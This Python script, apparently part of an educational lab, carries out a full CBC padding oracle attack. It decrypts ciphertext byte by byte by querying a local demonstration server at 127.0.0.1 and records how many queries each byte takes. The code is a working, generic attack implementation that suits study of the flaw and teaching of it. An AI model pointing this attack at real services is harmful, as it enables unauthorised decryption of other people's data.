# phase2/attack.py


"""
attack.py — Byte-wise Padding Oracle Attack (Phase 2).

Now accepts any plaintext via command-line argument or interactive prompt.
Supports messages longer than 16 bytes (multi-block attack).

Usage:
  python attack.py                          # prompts for input
  python attack.py "Hello World"            # attack this message
  python attack.py "My secret message!!"   # any length works
"""

import json, os, sys, time, requests
from rich.console import Console
from rich.table   import Table

BLOCK_SIZE = 16
ORACLE_URL = "http://127.0.0.1:5000/decrypt"
console    = Console()


# ── Oracle ────────────────────────────────────────────────────────────────────

class OracleClient:
    def __init__(self, url: str = ORACLE_URL):
        self.url     = url
        self.queries = 0

    def query(self, iv: bytes, ciphertext: bytes) -> bool:
        """
        Returns True  (HTTP 200) — padding valid
                False (HTTP 403) — padding invalid  ← oracle signal
        """
        self.queries += 1
        resp = requests.post(self.url, json={
            "iv":         iv.hex(),
            "ciphertext": ciphertext.hex()
        })
        return resp.status_code == 200


# ── Core Attack Logic ─────────────────────────────────────────────────────────

def attack_block(
    oracle:     OracleClient,
    prev_block: bytes,
    curr_block: bytes,
    stats:      list
) -> bytes:
    """Recover one 16-byte plaintext block using the padding oracle."""
    intermediate = bytearray(BLOCK_SIZE)
    plaintext    = bytearray(BLOCK_SIZE)

    for byte_idx in range(BLOCK_SIZE - 1, -1, -1):
        pad_val        = BLOCK_SIZE - byte_idx
        queries_before = oracle.queries
        found          = False

        for guess in range(256):
            crafted = bytearray(BLOCK_SIZE)
            for k in range(byte_idx + 1, BLOCK_SIZE):
                crafted[k] = intermediate[k] ^ pad_val
            crafted[byte_idx] = guess

            if oracle.query(bytes(crafted), curr_block):
                # False-positive check
                if byte_idx > 0:
                    verify = bytearray(crafted)
                    verify[byte_idx - 1] ^= 0x01
                    if not oracle.query(bytes(verify), curr_block):
                        continue

                intermediate[byte_idx] = guess ^ pad_val
                plaintext[byte_idx]    = intermediate[byte_idx] ^ prev_block[byte_idx]
                queries_used           = oracle.queries - queries_before
                stats.append(queries_used)

                ch = chr(plaintext[byte_idx]) if 32 <= plaintext[byte_idx] < 127 else "."
                console.print(
                    f"  Byte [{byte_idx:2d}]  "
                    f"guess=0x{guess:02x}  "
                    f"plain=0x{plaintext[byte_idx]:02x} ('{ch}')  "
                    f"queries={queries_used}",
                    style="green"
                )
                found = True
                break

        if not found:
            console.print(f"  Byte [{byte_idx:2d}] FAILED", style="red")
            stats.append(oracle.queries - queries_before)

    return bytes(plaintext)


def run_attack(iv: bytes, ciphertext: bytes, target: str) -> tuple[bytes, list]:
    """Run the full padding oracle attack across all ciphertext blocks."""
    oracle     = OracleClient()
    stats      = []
    blocks     = [ciphertext[i:i+BLOCK_SIZE]
                  for i in range(0, len(ciphertext), BLOCK_SIZE)]
    num_blocks = len(blocks)

    console.rule("[bold red]Padding Oracle Attack — Phase 2")
    console.print(f"[yellow]Target plaintext : [green]\"{target}\"")
    console.print(f"[yellow]Blocks to attack : {num_blocks}")
    console.print(f"[yellow]Ciphertext bytes : {len(ciphertext)}")
    console.print(f"[yellow]Oracle URL       : {oracle.url}\n")

    recovered  = bytearray()
    start_time = time.time()

    for blk_num, curr_block in enumerate(blocks):
        prev_block = iv if blk_num == 0 else blocks[blk_num - 1]
        console.print(f"\n[bold cyan]── Block {blk_num + 1}/{num_blocks} ──")
        recovered += attack_block(oracle, prev_block, curr_block, stats)

    elapsed = time.time() - start_time

    # Strip PKCS#7 padding
    pad_len = recovered[-1]
    if 1 <= pad_len <= BLOCK_SIZE:
        recovered = recovered[:-pad_len]

    # Summary table
    console.rule("[bold green]Attack Complete")
    tbl = Table(title="Attack Summary", style="cyan")
    tbl.add_column("Metric",        style="bold white")
    tbl.add_column("Value",         style="yellow")
    tbl.add_row("Target",           target)
    tbl.add_row("Recovered text",   recovered.decode(errors="replace"))
    tbl.add_row("Match",            "✔ YES" if recovered.decode(errors="replace") == target else "✘ NO")
    tbl.add_row("Total queries",    str(oracle.queries))
    tbl.add_row("Bytes recovered",  str(len(recovered)))
    tbl.add_row("Blocks attacked",  str(num_blocks))
    tbl.add_row("Avg queries/byte", f"{oracle.queries / max(len(recovered),1):.1f}")
    tbl.add_row("Max queries/byte", str(max(stats)))
    tbl.add_row("Min queries/byte", str(min(stats)))
    tbl.add_row("Time elapsed",     f"{elapsed:.2f}s")
    console.print(tbl)

    return bytes(recovered), stats


# ── Entry Point ───────────────────────────────────────────────────────────────

if __name__ == "__main__":

    # Get target from command-line arg or prompt
    if len(sys.argv) > 1:
        TARGET = " ".join(sys.argv[1:])
    else:
        console.print("[bold cyan]Padding Oracle Attack — Phase 2")
        console.print("[dim]Leave blank to use default: 'AttackSuccess!!'\n")
        user_input = input("Enter plaintext to attack: ").strip()
        TARGET     = user_input if user_input else "AttackSuccess!!"

    console.print(f"\n[bold white]Target : [green]\"{TARGET}\"")
    console.print(f"[dim]Length : {len(TARGET)} bytes  "
                  f"→  {-(-len(TARGET)//BLOCK_SIZE)} block(s)\n")

    # Encrypt via CBC server
    console.print("[white]Requesting encryption from server...")
    try:
        resp = requests.post("http://127.0.0.1:5000/encrypt",
                             json={"plaintext": TARGET})
    except requests.exceptions.ConnectionError:
        console.print("[red]Cannot reach CBC server. Is phase1/server.py running?")
        sys.exit(1)

    if resp.status_code != 200:
        console.print("[red]Encryption failed."); sys.exit(1)

    data       = resp.json()
    iv         = bytes.fromhex(data["iv"])
    ciphertext = bytes.fromhex(data["ciphertext"])

    console.print(f"[white]IV         : [dim]{data['iv']}")
    console.print(f"[white]Ciphertext : [dim]{data['ciphertext']}\n")

    # Run the attack
    recovered, stats = run_attack(iv, ciphertext, TARGET)

    # Save stats for Phase 4
    os.makedirs("../phase4", exist_ok=True)
    with open("../phase4/attack_stats.json", "w") as f:
        json.dump({
            "target":        TARGET,
            "recovered":     recovered.decode(errors="replace"),
            "total_queries": sum(stats),
            "per_byte":      stats
        }, f, indent=2)
    console.print("\n[dim]Stats saved to phase4/attack_stats.json")